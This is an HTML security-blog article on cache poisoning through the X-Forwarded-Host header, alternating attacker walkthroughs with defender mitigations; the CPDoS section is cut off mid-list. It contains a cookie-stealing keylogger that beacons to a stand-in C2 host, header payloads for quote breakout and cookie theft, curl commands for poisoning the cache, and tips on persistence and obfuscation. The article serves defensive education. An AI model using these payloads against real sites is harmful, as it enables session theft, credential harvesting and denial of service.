<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark">
    <link rel="icon" href="../../favicon.ico">

    <title>Cache Poisoning: The Silent Web Attack You Need to Know About | Aegis Martin</title>

    <meta name="description" content="A deep-dive into cache poisoning from both attacker and defender perspectives — covering XSS via cache poison, Cache-Poisoned DoS (CPDoS), and open redirect amplification using the X-Forwarded-Host header.">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Barlow+Semi+Condensed:wght@400;600;700;800&family=Work+Sans:wght@400;500;600&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">

    <!-- Prism.js — syntax highlighting. Do NOT remove. -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
    <link rel="stylesheet" href="../../assets/css/base.css">
    <link rel="stylesheet" href="../../assets/css/article-page.css">
</head>
<body>

    <!-- Lightbox overlay — do NOT remove, required for image zoom -->
    <div class="lightbox-overlay" id="lightboxOverlay">
        <button class="lightbox-close" id="lightboxClose">&#x2715;</button>
        <img class="lightbox-img" id="lightboxImg" src="" alt="">
    </div>

    <canvas id="particleCanvas"></canvas>

    <!-- ════════════════════════════════════════════════════════
         NAVBAR — do NOT modify
    ════════════════════════════════════════════════════════════ -->
    <div class="nav-overlay" aria-hidden="true"></div>   
    <nav class="navbar">
        <div class="nav-container">
            <div class="nav-logo">
                <img src="../../assets/img/logo.png" alt="Aegis Martin Logo">
                <span class="logo-text">AEGIS MARTIN</span>
            </div>
            <button class="hamburger" aria-label="Toggle navigation" aria-expanded="false">
                <span></span>
                <span></span>
                <span></span>
            </button>
            <ul class="nav-links">
                <li><a href="../../index.html">Home</a></li>
                <li><a href="../../articles.html" class="active">Articles</a></li>
                <li><a href="../../aegiscli.html">AegisCLI</a></li>
            </ul>
        </div>
    </nav>

    <!-- ════════════════════════════════════════════════════════
         ARTICLE HERO — metadata header
    ════════════════════════════════════════════════════════════ -->
    <header class="article-hero">
        <div class="hero-inner">

            <div class="article-meta-row">
                <span class="series-badge exploring">EXPLORING CYBERSECURITY</span>

                <span class="meta-divider"></span>

                <span class="meta-item">
                    <svg viewBox="0 0 24 24" fill="none"><rect x="3" y="4" width="18" height="18" rx="2" stroke="currentColor" stroke-width="2"/><path d="M16 2v4M8 2v4M3 10h18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
                    Jan 10, 2026
                </span>

                <span class="meta-divider"></span>

                <span class="meta-item">
                    <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 6v6l4 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
                    6 min read
                </span>
            </div>

            <h1 class="article-title">Cache Poisoning: The Silent Web Attack You Need to Know About</h1>

            <p class="article-excerpt">
                Cache poisoning occurs when a cache designed to improve performance is manipulated to store malicious content. This article breaks down XSS via cache poison, Cache-Poisoned DoS, and open redirect amplification — from both attacker and defender perspectives.
            </p>

            <div class="article-tags-row">
                <span class="art-tag">#web-security</span>
                <span class="art-tag">#offensive-security</span>
                <span class="art-tag">#http</span>
            </div>

        </div>
    </header>

    <!-- ════════════════════════════════════════════════════════
         ARTICLE BODY — TOC sidebar + content column
    ════════════════════════════════════════════════════════════ -->
    <div class="article-layout">

        <!-- TABLE OF CONTENTS — auto-generated by JS, do NOT edit -->
        <aside class="toc-sidebar" id="tocSidebar">
            <div class="toc-header">
                <svg viewBox="0 0 24 24" fill="none"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
                Contents
            </div>
            <ul class="toc-list" id="tocList">
                <!-- populated automatically from h2/h3 headings -->
            </ul>
        </aside>

        <article class="article-content" id="articleContent">

            <!-- Cover image -->
            <div class="article-cover-inline">
                <img src="images/main.png" alt="HTTP Security Headers - Offensive Theory Part 2 cover">
            </div>

            <p>
                In this section, we will focus on cache poisoning. Cache poisoning occurs when a cache, which is intended to improve performance and conserve resources, is manipulated to store malicious content. In the following examples we will describe how cache poisoning is abused from an attacker's perspective, followed by corresponding mitigation strategies. For the test we will be using the <code>X-Forwarded-Host</code> header.
            </p>

            <div class="callout warning">
                <span class="callout-icon">⚠</span>
                <div class="callout-body">
                    <strong>Warning</strong>
                    The following material is intended for educational and defensive security research purposes only. It describes techniques observed in real-world attacks to help developers, defenders, and security practitioners understand and mitigate cache poisoning vulnerabilities. No authorization or encouragement for illegal activity is implied.
                </div>
            </div>

            <h2 id="preparation-attackers">Preparation for the Attack — Attacker's Perspective</h2>

            <ol>
                <li>
                    <p>First we must confirm whether the site blindly trusts <code>X-Forwarded-Host</code>.</p>

                    <p><strong>1.1</strong> Send a normal request and save the response:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -D - https://target-site.com/ > normal_response.txt</code></pre>
                    </div>

                    <p><strong>1.2</strong> Look inside the HTML for anything that uses the host/domain dynamically, like:</p>

                    <ol>
                        <li><code>&lt;script src="https://target-site.com/js/main.js"&gt;</code></li>
                        <li><code>&lt;link rel="stylesheet" href="https://target-site.com/css/style.css"&gt;</code></li>
                        <li><code>&lt;img src="https://target-site.com/images/logo.png"&gt;</code></li>
                        <li>Any social meta tags like <code>&lt;meta property="og:image" content="https://target-site.com/og.jpg"&gt;</code></li>
                        <li>Note the exact domain it uses (should be the real one).</li>
                    </ol>

                    <p><strong>1.3</strong> Send the fake request to see if there are any differences:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -D - -H "X-Forwarded-Host: evil.com" https://target-site.com/ > poisoned_response.txt</code></pre>
                    </div>

                    <p><strong>1.4</strong> Compare the two files to see if the responses differ. Easiest way is using <code>diff</code>:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">diff normal_response.txt poisoned_response.txt | grep evil</code></pre>
                    </div>

                    <p>Or perform a direct search:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">grep "evil.com" poisoned_response.txt</code></pre>
                    </div>

                    <p>If the fake domain appears in dynamic parts of the code (scripts, src, meta, images, etc.) — <strong>vulnerability confirmed.</strong></p>

                    <figure class="article-image">
                        <img src="images/1.png" alt="Diff output showing evil.com reflected in the poisoned response">
                        <figcaption>Confirmation: evil.com reflected in dynamic parts of the poisoned response</figcaption>
                    </figure>
                </li>

                <li>
                    <p>We still have 2 main confirmations to do:</p>

                    <ol>
                        <li>
                            <p><strong>The page is cacheable.</strong> This means the site has a shared cache in front (Cloudflare, nginx, etc.) that is allowed to store and reuse responses for multiple users. To confirm this, check the response headers:</p>
                            <ul>
                                <li><code>Cache-Control: public, max-age=300</code> → shared cache can store it for 5 minutes. Your poison will last up to 5 minutes max.</li>
                                <li><code>Cache-Control: private</code>, <code>no-cache</code>, or <code>no-store</code> → not cacheable by shared caches → poisoning impossible.</li>
                            </ul>

                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">BASH</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-bash">curl -I "https://target-site.com/?cb=test123"  # First: probably MISS
curl -I "https://target-site.com/?cb=test123"  # Second: look for HIT or increasing Age</code></pre>
                            </div>

                            <p>The homepage is unlikely to have public cache control, but it's still worth checking — high-traffic sites sometimes do cache homepages publicly. If not, spider the site by hitting individual assets. Use DevTools to find specific asset URLs, then confirm which parts can be poisoned:</p>

                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">BASH</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-bash">curl -I "https://target-site.com/some/path/or/file.jpg?cb=test123"</code></pre>
                            </div>

                            <p>Public cache control is designed for saving resources on non-critical parts of the site, so almost always there is a part that can be poisoned.</p>
                        </li>

                        <li>
                            <p><strong>Cache does NOT key on <code>X-Forwarded-Host</code>.</strong> As explained earlier, <code>Vary</code> changes the regular caching key. If <code>X-Forwarded-Host</code> is included in <code>Vary</code>, the cache will treat requests with different values as separate keys — your poison stays isolated to your request and normal users get the clean version. To confirm, simply check the response headers:</p>

                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">BASH</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-bash">curl -I "https://target-site.com"</code></pre>
                            </div>
                        </li>

                        <li>
                            <p>Now it's time to actually poison the cache.</p>
                        </li>
                    </ol>
                </li>
            </ol>

            <h2 id="preparation-defenders">Preparation for the Attack — Defender's Perspective</h2>

            <ul>
                <li><strong>Do not trust <code>X-Forwarded-Host</code> by default.</strong> Treat it as user input. Only accept it from trusted internal proxies and validate it strictly. Otherwise ignore or strip it.</li>
                <li><strong>Use a strict host allowlist.</strong> Validate <code>Host</code>, <code>X-Forwarded-Host</code>, and similar headers against a fixed list of allowed domains. Reject or normalize anything else.</li>
                <li><strong>Never build absolute URLs from request headers.</strong> Do not generate links, assets, redirects, or meta tags using <code>Host</code> or <code>X-Forwarded-Host</code>. Use a server-configured canonical domain instead.</li>
                <li><strong>Normalize headers at the edge.</strong> Strip <code>X-Forwarded-Host</code> at the CDN or reverse proxy. Re-add it only from trusted infrastructure so clients can't inject it.</li>
                <li><strong>Align cache keys with application logic.</strong> If a header affects the response, it must be included in <code>Vary</code>. If it should not affect content, it must not be used by the application at all.</li>
                <li><strong>Avoid public caching of dynamic HTML.</strong> Use <code>Cache-Control: private</code> or <code>no-store</code> for HTML pages. Reserve <code>public</code> caching for static assets only.</li>
                <li><strong>Prevent caching of error responses.</strong> Ensure 3xx, 4xx, and 5xx responses are not cached by shared caches.</li>
                <li><strong>Enforce canonical domains safely.</strong> Redirect to the canonical host using server configuration, not unvalidated request headers.</li>
                <li><strong>Monitor and test.</strong> Watch for cache anomalies and regularly test host header and cache behavior the same way an attacker would.</li>
            </ul>

            <p>There are multiple ways of taking advantage of this situation. We will cover the mainstream ways to do so.</p>

            <h2 id="option-1-xss-attackers">Option 1: XSS Cache Poisoning — Attacker's Perspective</h2>

            <p>
                If we oversimplify, an XSS attack occurs when a threat actor runs malicious JavaScript code in a user's browser under the site's context. Those scripts can steal data, redirect the user to a malicious site, and more. Let's see how it can be executed in our context.
            </p>

            <ol>
                <li>
                    <p><strong>Control our own domain/subdomain.</strong></p>
                    <p>
                        We need to buy or register a domain like <code>attacker.com</code>, or use a free subdomain from a provider, then point that domain to our server with our malicious code ready. The reason is simple — just look at this snippet:
                    </p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">HTML</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-html">&lt;img src="https://attacker.com/assets/js/evil.js"&gt;</code></pre>
                    </div>

                    <p>This was supposed to be a simple image — the <code>src</code> is there to point to it. But since the cache is poisoned, it will point to our server instead.</p>
                </li>

                <li>
                    <p><strong>Craft a malicious JS payload.</strong></p>
                    <p>
                        For this example we will use a simple keylogger that steals cookies and forms then beacons to our C2 (Command and Control). This code should be hosted at the exact path we pointed our poison to.
                    </p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">JAVASCRIPT</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-javascript">// Steal cookies and send to attacker
fetch('https://your-c2.com/log?data=' + encodeURIComponent(document.cookie));
// Or full keylogger
document.addEventListener('keydown', e =&gt; {
  fetch('https://your-c2.com/key?k=' + e.key);
});
// Bonus: Steal localStorage, hijack forms, mine crypto silently
alert('Pwned by cache poison!'); // For testing visibility</code></pre>
                    </div>

                    <p>Nothing stops us from making this script stealthier and more impactful. Our infrastructure is ready — time to execute the attack.</p>
                </li>

                <li>
                    <p><strong>Execute the plan and poison the cache.</strong></p>
                    <p>Send the poisoned request — the example showcases curl but other tools work too:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -D - -H "X-Forwarded-Host: attacker.com" "https://vuln-site.com/?cb=pwn1337" > poisoned.html</code></pre>
                    </div>

                    <p>Check <code>poisoned.html</code> — grep for <code>attacker.com</code> in scripts and links. If it's there, the backend reflected it.</p>
                    <p>Hit again without the header:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -D - "https://vuln-site.com/?cb=pwn1337" | grep attacker.com</code></pre>
                    </div>

                    <p>If it shows up and you see <code>X-Cache: HIT</code> → poisoned for all users.</p>
                </li>

                <li>
                    <p><strong>Verify XSS fires on victims.</strong></p>
                    <ol>
                        <li>Open the poisoned URL in a browser (incognito, no extensions).</li>
                        <li>DevTools → Network: confirm it's loading <code>https://attacker.com/evil.js</code>.</li>
                        <li>Console: if your JS has <code>console.log</code> or <code>alert</code>, it pops. Network tab shows beacons to your C2 with stolen data.</li>
                        <li>Multi-user test: spin up VMs or proxies — each "victim" gets the same poisoned cache hit and XSS executes client-side.</li>
                    </ol>
                </li>

                <li>
                    <p><strong>Bypass CSP.</strong></p>
                    <p>
                        Content Security Policy (CSP) often blocks external scripts via <code>script-src 'self'</code>. This makes XSS cache poisoning practically impossible — unless developers commit one crucial mistake. Sometimes dynamic links are served like this:
                    </p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">HTML</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-html">&lt;link rel="preconnect" href="https://[X-Forwarded-Host]/..."&gt;
&lt;img src="https://[X-Forwarded-Host]/logo.png" alt="..."&gt;
&lt;script src="https://[X-Forwarded-Host]/static/js/main.js"&gt;&lt;/script&gt;
&lt;a href="https://[X-Forwarded-Host]/login"&gt;Login&lt;/a&gt;
&lt;div title="[X-Forwarded-Host] is the best"&gt;</code></pre>
                    </div>

                    <p>
                        To fight this we inject an <strong>inline</strong> script directly into the cached HTML. Because the <code>[X-Forwarded-Host]</code> value lands inside quotes (<code>""</code>), we can close them early and inject our payload — the classic quote breakout:
                    </p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">TEXT</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code>X-Forwarded-Host: example.com"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
                    </div>

                    <p>Now let's compare what happens to the code on the site. Original:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">HTML</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-html">&lt;script src="https://example.com/main.js"&gt;&lt;/script&gt;</code></pre>
                    </div>

                    <p>Will now turn into:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">HTML</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-html">&lt;script src="https://example.com"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;/main.js"&gt;&lt;/script&gt;</code></pre>
                    </div>

                    <figure class="article-image">
                        <img src="images/2.png" alt="Before and after comparison of HTML reflecting the injected X-Forwarded-Host payload">
                        <figcaption>Quote breakout: the injected payload splits the script tag, causing the browser to parse two separate tags</figcaption>
                    </figure>

                    <p>
                        The browser parses this as two separate script tags. The inline script runs instantly. CSP often allows <code>unsafe-inline</code>, or doesn't block it on older sites. More importantly, because we poisoned the cache, CSP sees our script as <strong>trusted</strong> since it's being served directly from the HTML body of the trusted origin — our <code>target.com</code>.
                    </p>

                    <p>There are still some interesting payloads worth noting:</p>

                    <ol>
                        <li>
                            <p>If they HTML-encode the quotes (rare), try the URL-encoded version:</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">TEXT</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code>X-Forwarded-Host: example.com%22%3e%3cscript%3ealert(document.domain)%3c/script%3e</code></pre>
                            </div>
                        </li>

                        <li>
                            <p>Silent payload to avoid alerts:</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">TEXT</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code>X-Forwarded-Host: x.com%22%3e%3cscript%3esetTimeout(()%3d%3e{fetch('https://attacker.com/steal?c='%2bdocument.cookie)},1000)%3c/script%3e</code></pre>
                            </div>
                        </li>

                        <li>
                            <p>When it's in <code>title=</code> or <code>alt=</code> (no src/href):</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">TEXT</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code>X-Forwarded-Host: "&gt;&lt;script src=//attacker.com/evil.js&gt;&lt;/script&gt;</code></pre>
                            </div>
                        </li>

                        <li>
                            <p>If nothing works, try JSON injection (if host is used in a JSON response):</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">TEXT</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code>X-Forwarded-Host: {"evil":true}//example.com</code></pre>
                            </div>
                            <p>This breaks the JSON structure. Angular/React <em>sometimes</em> treats it as a JS expression, which allows arbitrary code execution.</p>
                        </li>
                    </ol>

                    <div class="callout warning">
                        <span class="callout-icon">⚠</span>
                        <div class="callout-body">
                            <strong>Warning</strong>
                            In practice, unless the JSON is <code>eval</code>'d unsafely (which is itself another vulnerability), the JSON injection method won't work. Don't count on it.
                        </div>
                    </div>

                    <p>Finally, confirm whether the bypass is possible by running these tests:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash"># Test 1 - basic breakout
curl -H "X-Forwarded-Host: x.com\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;" "https://vuln.com/?cb=1337"

# Test 2 - encoded version
curl -H "X-Forwarded-Host: x.com%22%3e%3cscript%3ealert(1)%3c/script%3e" "https://vuln.com/?cb=1337"

# Test 3 - with a dummy param to avoid trailing garbage
curl -H "X-Forwarded-Host: x.com/anything\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;" "https://vuln.com/?cb=1337"</code></pre>
                    </div>

                    <p>If any of these work, the CSP bypass is possible and it's time to inject the actual payload.</p>
                </li>

                <li>
                    <p><strong>Mistakes to avoid.</strong></p>
                    <ol>
                        <li>
                            <p><strong>Forced Prefix or Suffix Handling.</strong> Some implementations prepend or append fixed strings to user-controlled host values, such as adding <code>https://</code> or a trailing <code>/</code>. For example:</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">HTML</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-html">&lt;script src="https://https://example.com/js/main.js"&gt;&lt;/script&gt;</code></pre>
                            </div>
                            <p>This results in a duplicated protocol, producing an invalid URL. If you inject <code>x.com"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> it may be reflected as:</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">HTML</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-html">&lt;script src="https://https://x.com"&gt;&lt;script&gt;alert(1)&lt;/script&gt;/js/main.js"&gt;&lt;/script&gt;</code></pre>
                            </div>
                            <p>The browser fails to execute the injected script due to the malformed URL. Common bypass techniques: start the payload with <code>//</code> to neutralize the enforced protocol, or absorb the appended suffix using a dummy path segment.</p>
                        </li>

                        <li>
                            <p><strong>Trailing Path Appended by the Application.</strong> Some apps construct script URLs dynamically, e.g. <code>"https://" + host + "/static/js/main.js"</code>. An injected value like <code>example.com"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> becomes:</p>
                            <div class="code-block-wrapper">
                                <div class="code-block-header">
                                    <div class="code-dots"><span></span><span></span><span></span></div>
                                    <span class="code-lang">HTML</span>
                                    <button class="code-copy-btn" data-copy>Copy</button>
                                </div>
                                <pre><code class="language-html">&lt;script src="https://example.com"&gt;&lt;script&gt;alert(1)&lt;/script&gt;/static/js/main.js"&gt;&lt;/script&gt;</code></pre>
                            </div>
                            <p>The trailing path breaks the injected tag, causing the browser to ignore it. Mitigations: add a fake path segment to absorb the suffix, or use comment/tag-balancing techniques to preserve valid HTML.</p>
                        </li>

                        <li>
                            <p><strong>Input Sanitization or Truncation.</strong> Some applications sanitize input by escaping or removing quotes, replacing <code>&lt;</code> and <code>&gt;</code> with HTML entities, or truncating overly long values. These defenses often prevent direct tag injection. Bypass strategies: test URL-encoded characters (e.g., <code>%22</code>, <code>%3C</code>) or use shorter/alternative payload structures.</p>
                        </li>

                        <li>
                            <p><strong>Host Validation or Normalization.</strong> Some systems restrict allowed domains, normalize input, or strip special characters. As a result, malicious input may be rejected outright or transformed into a non-executable string.</p>
                        </li>

                        <li>
                            <p><strong>Non-Injectable Reflection Context.</strong> If the reflected value appears inside a text node, JSON structure, or an attribute without quotes, breaking out into executable HTML may not be possible.</p>
                        </li>
                    </ol>
                </li>

                <li>
                    <p><strong>Maximize the attack's capabilities.</strong></p>
                    <ol>
                        <li>
                            <p><strong>Mass Scale.</strong> The more popular the poisoned page, the more victims are lured. <code>Cache-Control</code> also tells you how big your attack window is. For example: <code>max-age=86400</code> (24 hours) means your poison can live for a full day unless the cache is evicted early. No need to re-poison constantly.</p>
                        </li>
                        <li>
                            <p><strong>Chain with SSRF/redirects.</strong> If the reflection lets you control full URLs (not just the host), abuse it deeper. Point resources to internal IPs (<code>127.0.0.1</code>, <code>169.254.169.254</code> for cloud metadata). Victims' browsers fetch those, exfiltrating internal data (AWS keys, DB credentials) to your server via error logs. Classic client-side SSRF. Or force open redirects by reflecting into <code>&lt;meta refresh&gt;</code> or <code>location.href</code> — the poisoned page bounces all visitors to your phishing site for mass credential harvesting.</p>
                        </li>
                        <li>
                            <p><strong>Persistence.</strong> Cache will eventually expire, but we can't allow that. A script/cronjob that re-sends the poison request every few minutes refreshes the cache indefinitely. Advanced technique: poison ETags or <code>Last-Modified</code> headers too — the victim's <strong>browser cache</strong> holds the poison forever (even after the CDN clears). Eternal XSS until the user manually clears cache.</p>
                        </li>
                        <li>
                            <p><strong>Detection evasion.</strong> Ways to extend your poison's lifespan: register lookalike domains (e.g., <code>secure-vulnsite.com</code>) to delay suspicion. Obfuscate your JS: minify, encrypt strings, use <code>eval(fromCharCode)</code>, no obvious alerts. Make it silent — only exfiltrate data, no popups or defacement.</p>
                        </li>
                    </ol>
                </li>
            </ol>

            <h2 id="xss-defenders">XSS Cache Poisoning — Defender's Perspective</h2>

            <ul>
                <li><strong>Never reflect request headers into HTML.</strong> Not in <code>src</code>, <code>href</code>, <code>title</code>, meta tags, JSON — anywhere. Headers are transport metadata, not template variables. If a header reaches HTML, someone screwed up.</li>
                <li><strong>Use a fixed, server-side canonical origin.</strong> All absolute URLs must come from configuration, not runtime input. If the app ever does <code>"https://"</code> + something from the request, that's a red flag waving a flamethrower.</li>
                <li><strong>Context-aware output encoding, always.</strong> HTML-encode for text nodes, attribute-encode for attributes, JS-encode for JS, JSON-encode for JSON. One-size-fits-all escaping is how quote breakouts happen.</li>
                <li><strong>Eliminate <code>unsafe-inline</code> in CSP.</strong> Inline scripts turn quote injection into instant code execution. Use nonces or hashes only. Old sites with <code>unsafe-inline</code> are basically asking to be haunted.</li>
                <li><strong>Disallow dynamic script origins entirely.</strong> <code>script-src</code> should be <code>'self'</code> plus exact allowlisted domains. No wildcards, no runtime-generated hosts, no "but it's flexible".</li>
                <li><strong>Reject malformed host values early.</strong> If a value contains quotes, angle brackets, spaces, or encoded equivalents, drop the request. Hosts are domains, not creative writing exercises.</li>
                <li><strong>Lock down HTML templating logic.</strong> Templates should not concatenate strings to build tags. Use framework helpers that auto-escape and enforce context safety.</li>
                <li><strong>Separate data and markup strictly.</strong> JSON responses must never be <code>eval</code>'d or treated as executable code. If frontend logic executes server responses, the problem predates cache poisoning.</li>
                <li>
                    <strong>Set defensive browser headers.</strong>
                    <ul>
                        <li><code>X-Content-Type-Options: nosniff</code></li>
                        <li><code>Referrer-Policy: strict-origin-when-cross-origin</code></li>
                        <li><code>Cross-Origin-Opener-Policy</code> and <code>Cross-Origin-Embedder-Policy</code> — these won't fix the bug, but they reduce blast radius.</li>
                    </ul>
                </li>
                <li><strong>Monitor for external asset loads.</strong> Alert when pages suddenly load scripts, images, or fonts from new domains. That's usually not a feature launch.</li>
                <li><strong>Actively test your own site like an attacker.</strong> Inject quotes, encoded payloads, broken hosts, weird headers. If the HTML breaks, attackers already found it.</li>
            </ul>

            <h2 id="option-2-cpdos-attackers">Option 2: Cache Poisoned DoS (CPDoS) — Attacker's Perspective</h2>

            <p>
                A Cache-Poisoned Denial-of-Service <strong>(CPDoS)</strong> is achieved when an attacker caches a malicious or malformed response that causes the legitimate page content to become inaccessible. Once stored in the cache, the poisoned response is served to all users attempting to access the affected resource — effectively resulting in a denial of service.
            </p>

            <ol>
                <li>
                    <p><strong>Find a Poison Value That Triggers Backend Errors.</strong></p>
                    <p>Not every redirect will work for CPDoS. First, we must find a fake host that will make the origin <em>freak out</em>. Common triggers:</p>
                    <ol>
                        <li><strong>Invalid or disallowed host:</strong> If the backend has a whitelist of allowed hosts (via server config or WAF), set <code>X-Forwarded-Host</code> to something outside it. Result: 403 Forbidden or 400 Bad Request.</li>
                        <li><strong>Oversized host:</strong> Use a very long string as the fake host (e.g., "a" repeated 10,000 times). If the backend has header size limits tighter than the cache's, the cache accepts it and the origin rejects with 413 Payload Too Large.</li>
                        <li><strong>Meta characters or malformed host:</strong> Inject malformed host names with weird control chars (<code>\r\n</code>) or invalid characters if the backend parses strictly. Could trigger 400 or internal errors.</li>
                        <li><strong>Host pointing to non-existent resources:</strong> If the backend uses the host to fetch internal content (e.g., redirects or proxying), a bogus one might cause 502 Bad Gateway or timeouts.</li>
                    </ol>

                    <p>Now perform testing:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -D - -H "X-Forwarded-Host: superlongevilhostthatexceedslimits.example.com" https://target-site.com/ > error_response.txt</code></pre>
                    </div>

                    <p>Then grep the response for errors:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">grep -E "400|403|413|500|502|503" error_response.txt</code></pre>
                    </div>

                    <p>Or look at the body for generic error pages like "Bad Request" or "Access Denied". If any error appears that wouldn't have been there without your manipulated request — first green flag for a potential CPDoS attack.</p>
                </li>

                <li>
                    <p><strong>Confirm the Error Gets Cached.</strong></p>
                    <p>We confirmed the error occurs, but we haven't confirmed it's cached. We don't <em>assume</em> — we check. Send a normal request now:</p>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <div class="code-dots"><span></span><span></span><span></span></div>
                            <span class="code-lang">BASH</span>
                            <button class="code-copy-btn" data-copy>Copy</button>
                        </div>
                        <pre><code class="language-bash">curl -s -D - https://target-site.com/ > post_poison.txt</code></pre>
                    </div>

                    <ol>
                        <li><strong>Compare:</strong> If <code>post_poison.txt</code> also contains the error, then the poison will work for everyone.</li>
                        <li><strong>Bonus:</strong> Use a cache-buster param if needed (e.g., <code>?cb=ignoreme</code>), but only if the cache keys ignore it. Watch the <code>Age</code> header increase on repeats to confirm hits.</li>
